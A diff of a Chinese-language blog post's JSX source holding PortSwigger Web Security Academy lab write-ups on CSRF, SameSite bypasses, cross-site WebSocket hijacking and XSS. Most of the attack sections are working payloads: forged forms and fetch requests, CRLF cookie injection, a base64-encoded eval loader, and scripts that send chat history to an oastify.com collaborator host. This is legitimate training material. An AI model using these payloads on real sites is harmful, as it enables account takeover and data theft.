@@ -115,10 +115,7 @@ export default function Post() {
                 `}
             />
             <X.P>那么直接访问{'`/product?productId=2&storeId=<script>alert(0)</script>`'}即可。</X.P>
-            <X.H2>【-】Pr: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</X.H2>
-            <X.HighlightBlock background="red">
-                <X.P>待做！</X.P>
-            </X.HighlightBlock>
+            <X.H2>[TODO] Pr: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</X.H2>
             <X.H2>Pr: Reflected DOM XSS</X.H2>
             <X.P>网站请求了`searchResults.js`，审计一下代码，发现有调用`eval`函数：</X.P>
             <X.CodeBlock
@@ -149,7 +146,7 @@ export default function Post() {
                 `}
             />
             <X.P>`replace`函数这样调用只会转义首次出现的地方，正确实践应该使用正则表达式：</X.P>
-            <X.Image src="lab-dom-xss-stored.jpg" filterDarkTheme />
+            <X.Image src="lab-stored-dom-xss.jpg" filterDarkTheme />
             <X.P>本题可以用{'`<><img src=0 onerror="alert(0)">`'}注入。</X.P>
             <X.H2>Pr: Reflected XSS into HTML context with most tags and attributes blocked</X.H2>
             <X.P>用@XSS Cheat Sheet[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet]@生成的字典fuzz一下，看到{'`<body onresize="print()">`'}没有被屏蔽；构造payload让`iframe`加载后触发`onresize`事件：</X.P>
@@ -185,10 +182,7 @@ export default function Post() {
             />
             <X.P>官方题解的思路更简洁一点，核心想法是给元素带上`tabindex`属性后，就可以触发`onfocus`事件（payload中同样需要在URL结尾加上`#xxx`）：</X.P>
             <X.CodeBlock language="html" code='<xxx onfocus="alert(document.cookie)" id="xxx" tabindex="0">' />
-            <X.H2>【-】Pr: Reflected XSS with some SVG markup allowed</X.H2>
-            <X.HighlightBlock background="red">
-                <X.P>待做！</X.P>
-            </X.HighlightBlock>
+            <X.H2>[TODO] Pr: Reflected XSS with some SVG markup allowed</X.H2>
             <X.H2>Pr: Reflected XSS in canonical link tag</X.H2>
             <X.P>本题没有可以显式输入的地方，注意到访问的URL以及参数会被反射到{'`<link rel="canonical" href="...">`'}中，并且可以用单引号闭合注入其他属性。</X.P>
             <X.P>根据题目提示，用户会使用快捷键，考虑注入`accesskey`属性和`onclick`事件，payload为`/?%27accesskey=%27x%27onclick=%27alert(0)`。</X.P>
@@ -224,6 +218,241 @@ export default function Post() {
                 </script>
                 `}
             />
+            <X.H1>CSRF: Cross-site request forgery</X.H1>
+            <X.H2>笔记</X.H2>
+            <X.Uli>
+                <X.P>`SameSite`是Cookie的一个属性，用来控制跨站点请求时是否携带Cookie。可以取下面三种值：</X.P>
+                <X.Uli>`Strict`：完全禁止跨站点请求携带Cookie。</X.Uli>
+                <X.Uli>
+                    <X.P>`Lax`：允许部分跨站点请求携带Cookie，请求要同时满足以下两个条件：</X.P>
+                    <X.Oli>请求是顶级导航`(top-level navigation)`（本质上会导致浏览器地址栏中显示的URL发生变化）：点击链接、对`window.location`赋值、表单提交等；</X.Oli>
+                    <X.Oli>请求方法是`@safe HTTP method[https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP]@`，最常见的是`GET`。</X.Oli>
+                </X.Uli>
+                <X.Uli>`None`：允许跨站点请求携带Cookie，但必须同时设置`Secure`属性（只能通过HTTPS发送）。</X.Uli>
+            </X.Uli>
+            <X.Uli>默认情况下，`fetch`请求在跨源时不会携带Cookie，需要设置`credentials: 'include'`。注意如果Cookie的`SameSite`属性是`Lax`或`Strict`，即使设置了`credentials: 'include'`也不会携带。</X.Uli>
+            <X.Uli>
+                <X.P>前面几个CSRF的Lab能打通是因为服务端下发的Cookie显式设置了`SameSite=None; Secure`，因此跨站请求时能够自动携带。实际上默认的`SameSite`属性是`Lax`（此时只能通过CSRF伪造`GET`请求）。</X.P>
+                <X.Image src="note-csrf.jpg" filterDarkTheme />
+            </X.Uli>
+            <X.Uli>
+                <X.P>`SameSite`属性是从2016年引入的，在此之前主流的CSRF防御方式是CSRF Token和双重提交Cookie。</X.P>
+                <X.Uli>CSRF Token通常作为隐藏域放在表单中，机制安全的核心是*攻击者无法预测Token*（跨源场景下攻击者也无法访问DOM）。服务端为了校验，通常需要将CSRF Token和会话（登录态）绑定。CSRF Token需要前后端配合做全套的实现，工程量较大。</X.Uli>
+                <X.Uli>双重提交Cookie是一种更轻量级的方案，网站下发一个Cookie，值随机，要求前端在请求时同时将这个值放在请求参数中提交，服务端只需要校验参数和Cookie的值是否相同即可。这种机制安全的核心是跨源场景下*攻击者无法读/写目标站Cookie的值*（浏览器环境中的请求也无法自定义Cookie），因此无法构造出合法的请求。</X.Uli>
+                <X.Uli>双重提交Cookie在大型网站中没有CSRF Token安全，参考@这篇博客[https://tech.meituan.com/2018/10/11/fe-security-csrf.html]@中的例子，例如某个网站`www.site.com`，后端域名是`api.site.com`，此时为了前端能访问到Cookie，`Domain`属性需设置为主域`site.com`。此时只要任意一个子域存在XSS（比如`vuln.site.com`），攻击者就可以写入主域的Cookie，从而伪造出合法请求。</X.Uli>
+            </X.Uli>
+            <X.Uli>
+                <X.P>一个有趣的特性：@参考链接[https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#attributes]@</X.P>
+                <X.P>`SameSite`的默认值的确是`Lax`，但不设置`SameSite`属性和显式设置为`SameSite=Lax`有细小的行为差别；不设置`SameSite`属性的Cookie在被设置的两分钟内会被包含在跨站`POST`请求中。</X.P>
+                <X.HighlightBlock background="gray">
+                    <X.P>Some browsers use `Lax` as the default value if `SameSite` is not specified: see @Browser compatibility[https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#browser_compatibility]@ for details.</X.P>
+                    <X.HighlightBlock background="blue">
+                        <X.P>*Note*: When `Lax` is applied as a default, a more permissive version is used. In this more permissive version, cookies are also included in `POST` requests, as long as they were set *no more than two minutes* before the request was made.</X.P>
+                    </X.HighlightBlock>
+                </X.HighlightBlock>
+            </X.Uli>
+            <X.Uli>
+                <X.P>跨源场景下，如果是简单请求，浏览器会直接发起请求，服务器需要在响应头中返回`Access-Control-Allow-Origin`等来允许跨源请求； 如果不是简单请求，浏览器会先发起一个`OPTIONS`预检请求，询问服务器是否允许该跨源请求，服务器需要返回`Access-Control-Allow-Origin`和`Access-Control-Allow-Methods`等响应头来允许（以及限制）该跨源请求。</X.P>
+                <X.P>@HTTP简单请求[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CORS#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82]@：</X.P>
+                <X.Uli>是`GET`、`HEAD`或`POST`请求；</X.Uli>
+                <X.Uli>`Content-Type`只能是`text/plain`、`multipart/form-data`或`application/x-www-form-urlencoded`；</X.Uli>
+                <X.Uli>对可以使用的HTTP头有严格限制（见文档），也不允许自定义标头。</X.Uli>
+            </X.Uli>
+            <X.Uli>HTTP方法覆盖`(HTTP method override)`：@参考链接1[https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/]@、@参考链接2[https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods#testing-for-http-method-overriding]@</X.Uli>
+            <X.H2>Ap: CSRF vulnerability with no defenses</X.H2>
+            <X.P>利用表单：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <form action="https://0a3a00630306bc63802c127300b50043.web-security-academy.net/my-account/change-email" method="post">
+                    <input type="hidden" name="email" value="1@1.com"/>
+                </form>
+                <script>
+                    document.forms[0].submit();
+                </script>
+                `}
+            />
+            <X.P>利用`fetch`：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <script>
+                    fetch('https://0a3a00630306bc63802c127300b50043.web-security-academy.net/my-account/change-email', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: 'email=1@1.com',
+                        credentials: 'include',
+                    });
+                </script>
+                `}
+            />
+            <X.H2>Pr: CSRF where token validation depends on request method</X.H2>
+            <X.P>`POST`请求有CSRF Token防御，会验证`csrf`参数的值，但是接口同样支持`GET`请求访问且不验证参数。</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <script>
+                    fetch('https://0a3100890481841c807ea89a00760057.web-security-academy.net/my-account/change-email?email=1@1.com', {
+                        credentials: 'include',
+                    });
+                </script>
+                `}
+            />
+            <X.H2>Pr: CSRF where token validation depends on token being present</X.H2>
+            <X.P>服务端会验证`csrf`参数，但仅当这个参数存在时才会验证。使用与无防御CSRF一样的payload就能打通。</X.P>
+            <X.H2>Pr: CSRF where token is not tied to user session</X.H2>
+            <X.P>CSRF Token和登录态没有绑定，可以登录`wiener`账号得到`csrf`的值，然后构造payload：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <script>
+                    fetch('https://0a5b00e80339378580bdad6800d200f2.web-security-academy.net/my-account/change-email', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: 'email=1@1.com&csrf=38IFS7Sq33CTndE1WhceiRrysMuTqdL7',
+                        credentials: 'include',
+                    });
+                </script>
+                `}
+            />
+            <X.H2>Pr: CSRF where token is tied to non-session cookie</X.H2>
+            <X.P>首先，查看Cookie发现本题多了`csrfKey`，并且这个Cookie是不与登录态绑定的，也就是只要`csrfKey`Cookie和`csrf`参数对应，就可以通过校验。</X.P>
+            <X.P>浏览器侧的`fetch`请求无法自定义Cookie，但是注意到网站的搜索功能会设置`LastSearchTerm`Cookie，搜索的输入直接反射在服务端响应的头部：`LastSearchTerm=[INPUT]; Secure; HttpOnly`，当`[INPUT]`修改为`1%0d%0aSet-Cookie:%20csrfKey=some_key%3b%20SameSite=None`时，实际上注入了这样的请求头：</X.P>
+            <X.CodeBlock
+                language="text"
+                code={String.raw`
+                Set-Cookie: LastSearchTerm=1
+                Set-Cookie: csrfKey=some_key; SameSite=None; Secure; HttpOnly
+                `}
+            />
+            <X.P>因此，我们从登录的`wiener`账号中获取`csrfKey`Cookie和`csrf`参数，并且构造payload：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <script>
+                    window.open('https://0afa005e034e9839809e2bb800d10053.web-security-academy.net/?search=1%0d%0aSet-Cookie:%20csrfKey=TukdQfOhFalwVoTUOLw3njMEfqgjOmKf%3b%20SameSite=None');
+                    setTimeout(() =>
+                        fetch('https://0afa005e034e9839809e2bb800d10053.web-security-academy.net/my-account/change-email', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                            body: 'email=1@1.com&csrf=9bAsUdlVzClEiym1i9wq5frXiO3HhtVg',
+                            credentials: 'include',
+                        }), 1000);
+                </script>
+                `}
+            />
+            <X.H2>Pr: CSRF where token is duplicated in cookie</X.H2>
+            <X.P>本题使用双重Cookie防护，但是Cookie与上一题一样，可以通过搜索功能篡改。设置相同的`csrf`Cookie和`csrf`参数就可以通过校验。</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <script>
+                    window.open('https://0a6000c904b8174b80830dc500490091.web-security-academy.net/?search=1%0d%0aSet-Cookie:%20csrf=1234%3b%20SameSite=None');
+                    setTimeout(() =>
+                        fetch('https://0a6000c904b8174b80830dc500490091.web-security-academy.net/my-account/change-email', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                            body: 'email=1@1.com&csrf=1234',
+                            credentials: 'include',
+                        }), 1000);
+                </script>
+                `}
+            />
+            <X.H2>Pr: SameSite Lax bypass via method override</X.H2>
+            <X.P>本题更新邮箱接口不允许直接`GET`请求，但可以通过`_method=POST`覆盖请求方法。</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <script>
+                    window.open('https://0aa3008803acb5a480241c1e00a700b2.web-security-academy.net/my-account/change-email?email=1@1.com&_method=POST')
+                </script>
+                `}
+            />
+            <X.H2>Pr: SameSite Strict bypass via client-side redirect</X.H2>
+            <X.P>本题更新邮箱接口允许直接`GET`请求，但Cookie的`SameSite`属性是`Strict`。注意到`/post/comment/confirmation?postId=xxx`会触发客户端重定向，这相当于我们拥有了发起任意站内`GET`请求到能力。</X.P>
+            <X.P>本题的表单多了参数`submit=1`。</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <script>
+                    window.open('https://0a3100f3030de71a805503ab00690087.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3Femail=1@1.com%26submit=1')
+                </script>
+                `}
+            />
+            <X.H2>Pr: SameSite Strict bypass via sibling domain</X.H2>
+            <X.P>看到Cookie是`SameSite=Strict`的，不能简单通过CSRF伪造请求。</X.P>
+            <X.P>在部分静态资源的响应头中发现：</X.P>
+            <X.CodeBlock language="text" code="Access-Control-Allow-Origin: https://cms-0a31003e035f72f780b87ba700de000f.web-security-academy.net" />
+            <X.P>直接打开这个地址，发现一个简易的登录页面，登录失败时显示`Invalid username: ...`，存在反射XSS。</X.P>
+            <X.P>利用这一点，可以在“站内”（不同源，但同站）实现WebSocket劫持，脚本如下：</X.P>
+            <X.CodeBlock
+                language="js"
+                code={String.raw`
+                const ws = new WebSocket('wss://0a31003e035f72f780b87ba700de000f.web-security-academy.net/chat');
+                ws.onopen = function () {
+                    ws.send('READY');
+                }
+                ws.onmessage = function (evt) {
+                    var message = evt.data;
+                    fetch('https://yrte70ok6lp87wsiq09z98tnye45s2gr.oastify.com/', {
+                        method: 'POST',
+                        body: message
+                    });
+                }
+                `}
+            />
+            <X.P>做一些编码处理，发送给目标用户：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <form action="https://cms-0a31003e035f72f780b87ba700de000f.web-security-academy.net/login" method="post">
+                    <input type="hidden" name="username" value="<script>eval(atob('Y29uc3Qgd3MgPSBuZXcgV2ViU29ja2V0KCd3c3M6Ly8wYTMxMDAzZTAzNWY3MmY3ODBiODdiYTcwMGRlMDAwZi53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvY2hhdCcpOwp3cy5vbm9wZW4gPSBmdW5jdGlvbiAoKSB7CndzLnNlbmQoJ1JFQURZJyk7Cn0Kd3Mub25tZXNzYWdlID0gZnVuY3Rpb24gKGV2dCkgewp2YXIgbWVzc2FnZSA9IGV2dC5kYXRhOwpmZXRjaCgnaHR0cHM6Ly95cnRlNzBvazZscDg3d3NpcTA5ejk4dG55ZTQ1czJnci5vYXN0aWZ5LmNvbS8nLCB7Cm1ldGhvZDogJ1BPU1QnLApib2R5OiBtZXNzYWdlCn0pOwp9'))</script>"/>
+                    <input type="hidden" name="password" value="1"/>
+                </form>
+                <script>
+                    document.forms[0].submit();
+                </script>
+                `}
+            />
+            <X.P>带外的聊天记录中包含了`carlos`的密码。</X.P>
+            <X.H2>[TODO] Pr: SameSite Lax bypass via cookie refresh</X.H2>
+            <X.H2>Pr: CSRF where Referer validation depends on header being present</X.H2>
+            <X.P>服务端会验证`Referer`头，但仅当`Referer`头存在时才会验证。</X.P>
+            <X.P>浏览器中发送`fetch`请求时不能自定义非同源请求的`Referer`头，但可以通过设置`referrer`为空来阻止浏览器发送`Referer`头。</X.P>
+            <X.CodeBlock
+                language="html"
+                highlightLines="7"
+                code={String.raw`
+                <script>
+                    fetch('https://0a8d004c0404aa8980742bda005d006c.web-security-academy.net/my-account/change-email', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: 'email=1@1.com',
+                        credentials: 'include',
+                        referrer: '',
+                    });
+                </script>
+                `}
+            />
+            <X.H2>Pr: CSRF with broken Referer validation</X.H2>
+            <X.P>服务端会验证`Referer`头，但是经过测试发现仅验证`Referer`头中包含`xxx.web-security-academy.net`。</X.P>
+            <X.CodeBlock
+                language="html"
+                highlightLines="7-8"
+                code={String.raw`
+                <script>
+                    fetch('https://0a7f001404b0252c802e1c880096004f.web-security-academy.net/my-account/change-email', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: 'email=1@1.com',
+                        credentials: 'include',
+                        referrer: '/xxx?x=0a7f001404b0252c802e1c880096004f.web-security-academy.net',
+                        referrerPolicy: 'unsafe-url',
+                    });
+                </script>
+                `}
+            />
+
             <X.H1>SSRF: Server-side request forgery</X.H1>
             <X.H2>Ap: Basic SSRF against the local server</X.H2>
             <X.P>根据提示，发送请求：</X.P>
@@ -434,7 +663,81 @@ export default function Post() {
             <X.P>保存后，在访问记录里就可以看到：</X.P>
             <X.CodeBlock language="text" code="GET /exploit?c=secret=UzB89kNJHCZLkdW393yCPznnISTFaGyN;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" />
             <X.P>解码`stay-logged-in`，得到密码的MD5值`26323c16d5f4dabff3bb136f2460a943`，反查到明文是`onceuponatime`。</X.P>
-            {/* --- */}
+            <X.H1>WebSockets</X.H1>
+            <X.H2>Ap: Manipulating WebSocket messages to exploit vulnerabilities</X.H2>
+            <X.P>`/resources/js/chat.js`中发现有风险的代码：</X.P>
+            <X.CodeBlock
+                language="js"
+                highlightLines="7-8"
+                code={String.raw`
+                function writeMessage(className, user, content) {
+                    var row = document.createElement("tr");
+                    row.className = className
+
+                    var userCell = document.createElement("th");
+                    var contentCell = document.createElement("td");
+                    userCell.innerHTML = user;
+                    contentCell.innerHTML = (typeof window.renderChatMessage === "function") ? window.renderChatMessage(content) : content;
+
+                    row.appendChild(userCell);
+                    row.appendChild(contentCell);
+                    document.getElementById("chat-area").appendChild(row);
+                }
+                `}
+            />
+            <X.P>改包发送一个包含XSS payload的消息。</X.P>
+            <X.CodeBlock
+                language="text"
+                code={String.raw`
+                    {"message":"<img src=0 onerror='alert(0)'>"}
+                `}
+            />
+            <X.H2>Pr: Cross-site WebSocket hijacking</X.H2>
+            <X.P>WebSocket初始化后发送`'READY'`，服务端会响应聊天记录，带外即可。本题的Cookie仍然是`SameSite=None`，因此CSWSH攻击可以成功。</X.P>
+            <X.CodeBlock
+                language="html"
+                code={String.raw`
+                <script>
+                    const ws = new WebSocket('wss://0a7e0076047e32e381865d73002400cf.web-security-academy.net/chat');
+                    ws.onopen = function () {
+                        ws.send('READY');
+                    }
+                    ws.onmessage = function (evt) {
+                        var message = evt.data;
+                        fetch('https://zz2ff1wlemx9fx0jy1h0h91o6fc60zoo.oastify.com/', {
+                            method: 'POST',
+                            body: message
+                        });
+                    }
+                </script>
+                `}
+            />
+            <X.H2>Pr: Manipulating the WebSocket handshake to exploit vulnerabilities</X.H2>
+            <X.P>本题如果触发了XSS过滤器会被服务端封IP，需要通过`X-Forwarded-For`头绕过。</X.P>
+            <X.CodeBlock
+                language="python"
+                code={String.raw`
+                import asyncio
+                import json
+                import websockets
+
+                async def main():
+                    uri = "wss://0a3b002c049f9bf0806f03b0007a00d0.web-security-academy.net/chat"
+                    headers = [
+                        ("X-Forwarded-For", "1.2.3.4"),
+                    ]
+                    async with websockets.connect(uri, extra_headers=headers) as ws:
+                        # await ws.send("READY")
+                        # resp = await ws.recv()
+                        # print("recv:", resp)
+                        await ws.send(json.dumps({"message": "<img src=0 OnError=window['ale'+'rt'](0)>"}))
+                        resp = await ws.recv()
+                        print("recv:", resp)
+
+                if __name__ == "__main__":
+                    asyncio.run(main())
+                `}
+            />
             <X.H1>Information disclosure</X.H1>
             <X.H2>Ap: Information disclosure in error messages</X.H2>
             <X.P>要寻找的信息是在报错中泄露的使用的库的版本号，注意后端会把报错信息返回。把请求的参数改为单引号：`/product?productId=%27`，可以看到报错：</X.P>
